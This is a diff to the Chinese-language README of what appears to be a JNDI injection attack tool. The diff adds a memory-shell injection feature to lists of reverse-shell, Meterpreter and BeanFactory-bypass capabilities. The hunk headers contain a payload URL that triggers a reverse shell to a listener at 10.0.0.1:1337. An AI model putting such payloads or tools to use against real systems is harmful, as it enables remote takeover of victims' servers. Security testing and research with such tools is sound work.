@@ -39,6 +39,7 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 - 反弹 Shell
 - Meterpreter 上线
 - 加载自定义 Java 字节码
+- 内存马注入 (基于 [MemShellParty](https://github.com/ReaJason/MemShellParty))
 - Nashorn JS 自定义 Payload
 - BeanFactory 绕过
   - Tomcat
@@ -70,7 +71,8 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 - [Usage](USAGE.md#usage)
 - [URL 格式](USAGE.md#url-格式)
 - [Basic 功能](USAGE.md#basic)
-- [BeanFactory 绕过](USAGE.md#beanfactory-bypass)
+- [内存马注入](USAGE.md#内存马注入)
+- [BeanFactory 绕过](USAGE.md#beanfactory-绕过)
   - [Tomcat ELProcessor](USAGE.md#tomcat-elprocessor)
   - [Groovy ClassLoader/Shell](USAGE.md#groovy-classloadershell)
   - [XStream](USAGE.md#xstream)
